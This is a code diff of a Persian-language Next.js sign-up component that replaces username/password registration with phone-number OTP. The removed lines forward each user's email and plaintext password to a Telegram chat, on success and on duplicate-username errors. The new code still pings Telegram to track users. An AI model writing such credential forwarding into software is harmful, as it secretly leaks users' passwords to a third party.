@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import Image from "next/image";
 import Link from "next/link";
 import { useRouter } from "next/navigation";
-import React, { useEffect, useState } from "react";
+import React, { lazy, useEffect, useState } from "react";
 import { toast } from "sonner";
 
 function CreateAccount() {
@@ -16,32 +16,38 @@ function CreateAccount() {
   const router = useRouter();
   const [loading, setLoading] = useState(false);
 
-  const onCreateAcconut = () => {
+  const onCreateAcconut = async () => {
     setLoading(true);
-    GlobalApi.registerUser(email, password, username).then(
-      (resp) => {
-        console.log(resp.data.user);
-        console.log(resp.data.jwt);
-        sessionStorage.setItem("user", JSON.stringify(resp.data.user));
-        sessionStorage.setItem("jwt", resp.data.jwt);
-        router.push("/");
-        toast("حساب شما با موفقیت ایجاد شد✅");
-        sendTelegramMessage(
-          `user registered => username: ${email} password: ${password} `
-        );
-
-        window.location.href = "/";
+    sendTelegramMessage("user => otp")
+    if (/^(09\d{9}|98\d{10})$/.test(email)) {
+      try {
+        const res = await fetch(`${process.env.NEXT_PUBLIC_OTP_BASE_URL}`, {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: email }),
+        });
+        const data = await res.json();
+        if (data.ok) {
+          toast("کد با موفقیت ارسال شد ✅");
+          router.push('/sign-in')
+          sessionStorage.setItem("phone", email);
+        } else {
+          toast("ارسال کد با خطا مواجه شد ❗");
+        }
+      } catch (err) {
+        console.error(err);
+        toast("مشکلی پیش آمد ❗");
+      } finally {
         setLoading(false);
-      },
-      (e) => {
-        sendTelegramMessage(`user entered a duplicate username!
-entered username: ${email}
-entered password: ${password} `);
-        setLoading(false);
-        toast("نام کاربری قبلا انتخاب شده است❌");
       }
-    );
+    } else {
+      toast("شماره موبایل نادرست است ❌");
+      setLoading(false); 
+    }
   };
+
 
   useEffect(() => {
     const jwt = sessionStorage.getItem("jwt");
@@ -50,38 +56,34 @@ entered password: ${password} `);
     }
   }, []);
 
-  const t = () => {
-    sendTelegramMessage(`user => create-account`);
-  };
-
   return (
     <div
       lang="fa"
       dir="rtl"
       className="flex items-center justify-center mt-5 px-2"
     >
-      <div className="w-[400px] h-[480px] relative">
+      <div className="w-[400px] h-[350px] relative">
        
         <div className="absolute w-[85px] h-[85px] flex items-center justify-center border-2 border-green-500 rounded-full bg-white z-10 left-1/2 -translate-x-1/2 shadow-lg">
           <i className="fa fa-user-plus text-[50px] text-green-500"></i>
         </div>
 
        
-        <div className="absolute bottom-0 w-full h-[440px] bg-white border-2 border-green-200 rounded-[30px] p-[25px] flex flex-col shadow-xl">
-          <h2 className="text-green-600 text-xl font-bold mt-[40px] mb-[5px] text-center">ثبت نام</h2>
-          <h2 className="text-gray-600 font-bold mt-[0px] mb-[40px] text-center">برای ثبت نام یک نام کاربری و رمز عبور وارد کنید</h2>
+        <div className="absolute bottom-0 w-full h-[310px] bg-white border-2 border-green-200 rounded-[30px] p-[25px] flex flex-col shadow-xl">
+          <h2 className="text-green-600 text-xl font-bold mt-[40px] mb-[5px] text-center">ورود</h2>
+          <h2 className="text-gray-600 font-bold mt-[0px] mb-[40px] text-center">برای ورود شماره موبایل خود را وارد کنید</h2>
           
           <div className="relative w-full">
             <Input
               dir="rtl"
-              placeholder="  نام کاربری"
+              placeholder="شماره همراه"
               onChange={(e) => setEmail(e.target.value)}
               className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-2 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
             />
-            <i className="fa fa-user absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
+            <i className="fa fa-phone absolute left-2 bottom-[10px] text-green-500 text-sm"></i>
           </div>
 
-          <div className="relative w-full mt-[25px]">
+          {/* <div className="relative w-full mt-[25px]">
             <Input
               dir="rtl"
               type="password"
@@ -92,19 +94,19 @@ entered password: ${password} `);
               className="w-full bg-transparent border-none border-b-2 border-green-200 text-gray-700 text-base px-2 py-[10px] focus:outline-none focus:border-green-500 placeholder:text-gray-400"
             />
             <i className="fa fa-lock absolute left-2 bottom-[10px] text-green-500 text-sm password-icon"></i>
-          </div>
+          </div> */}
 
           <div className="mt-[25px]">
             <Button 
               onClick={() => onCreateAcconut()}
-              disabled={!(email && password)}
+              disabled={!(email)}
               className="w-full py-[5px] px-[20px] bg-green-500 text-white font-semibold text-base rounded-[15px] hover:bg-green-600 transition-all duration-300"
             >
-              ثبت نام
+              ارسال کد تایید
             </Button>
           </div>
 
-          <p className="text-center mt-[20px] text-gray-600">
+          {/* <p className="text-center mt-[20px] text-gray-600">
             قبلا ثبت نام کرده‌اید؟
             <Link
               onClick={t}
@@ -113,7 +115,7 @@ entered password: ${password} `);
             >
               ورود به حساب کاربری
             </Link>
-          </p>
+          </p> */}
         </div>
       </div>
 
